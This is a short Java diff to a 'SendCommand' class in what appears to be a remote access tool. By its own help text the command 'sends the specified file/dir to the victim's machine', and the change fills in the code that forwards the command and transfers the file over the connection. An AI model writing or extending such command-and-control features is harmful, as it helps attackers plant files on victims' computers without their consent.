@@ -8,6 +8,7 @@ import connection.Server;
 
 public class SendCommand extends Command{
 	private String _fileName;
+	private String _command;
 	
 	public SendCommand() {
 		super("send", "\"file/dir\"", "sends the specified file/dir to the victim's machine and uncompress it");
@@ -17,6 +18,7 @@ public class SendCommand extends Command{
 		boolean ok = false;
 		
 		if(command.contains(_commandName)) {
+			_command = command;
 			_fileName = command.split("\"")[1];
 			ok = true;
 		}
@@ -29,7 +31,8 @@ public class SendCommand extends Command{
 		File fileToSend = new File(_fileName);
 		
 		if(fileToSend.exists()) {
-			//send file
+			con.send(_command);
+			server.sendFile(fileToSend);
 		}
 		else {
 			System.out.println("File not found");
